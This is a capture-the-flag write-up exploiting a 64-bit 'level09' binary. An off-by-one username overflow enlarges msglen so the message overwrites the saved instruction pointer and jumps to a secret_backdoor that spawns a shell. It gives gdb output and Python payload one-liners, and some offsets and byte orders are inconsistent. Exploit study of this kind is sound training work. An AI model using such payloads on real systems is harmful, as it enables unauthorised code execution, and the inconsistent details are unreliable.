The program is in 64-bit mode, which means addresses are 8 bytes long. The program includes a secret_backdoor function, which allows executing a system command that we specify. In this exercise, the interesting part happens within the handle_msg function, there's a structure defined, consisting of:

    char msg[140]
    char username[40]
    int msglen

Next, there are functions that allow us to enter a username and a message, which are stored in the structure. The set_username function allows entering a 41-character username, creating a buffer overflow opportunity. We can overwrite the least significant byte of msglen, which is an int located just after the username, and set it to 255 maximum. This allows us to perform an overflow on the msg, consequently overwriting the rip (instruction pointer) to point to the puts function and transform it into the secret_backdoor function.

Steps to Exploit:

    Find the address of the secret_backdoor function:

(gdb) p secret_backdoor
$1 = {void (void)} 0x000055555555488c <secret_backdoor>

    Determine the offset between the message and rip, which should be after the first 188 bytes of the structure:


(gdb) run <<< $(python -c "print 'A'*40 + '\xc9' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A'")

The program crashes with a segmentation fault, indicating that rip is at 0x0000555555554a00, and we've successfully overwritten the least significant byte.

    Create a Python script to overflow rip and make it point to the secret_backdoor function:


This script includes padding, the least significant byte of msglen, and further padding to reach rip. We reverse the bytes of the secret_backdoor address to match little-endian order.

    [padding 40] + [least significant byte of msglen] + "\n" + [padding 200] + [address of secret_backdoor] + "\n"


{ python -c 'print "A"*40 + "\xff" + "\n" + "A"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh" + "\n"' ; cat - ;} | ./level09

This solution leverages a buffer overflow to manipulate the program's control flow and execute the secret_backdoor function, effectively granting a shell and displaying the final file.


{ python -c 'print "A"*40 + "\xca" + "\n" + "A"*200 + "\x8c\x48"[::-1] + "\n" + "/bin/sh" + "\n"' ; echo "cd ../end && cat end" ;} | ./level09

This command combines the Python script with a cd command to navigate to the "end" directory and display the "end" file.